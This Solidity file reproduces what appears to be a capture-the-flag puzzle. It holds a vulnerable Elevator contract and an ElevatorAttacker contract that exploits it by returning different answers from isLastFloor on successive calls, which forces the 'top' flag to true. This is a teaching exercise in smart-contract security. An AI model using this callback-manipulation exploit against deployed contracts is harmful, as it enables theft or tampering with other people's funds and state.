// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}


interface IElevator {
    function goTo(uint256 _floor) external;
}

contract ElevatorAttacker {
    bool public switchFlipped;

    function attack(address _targetAddress) public {
        IElevator elevator = IElevator(_targetAddress);

        elevator.goTo(42);
    }

    function isLastFloor(uint256) public returns (bool) {
        // first call
        if (!switchFlipped) {
            switchFlipped = true;
            return false;
        // second call
        } else {
            switchFlipped = false;
            return true;
        }
    }
}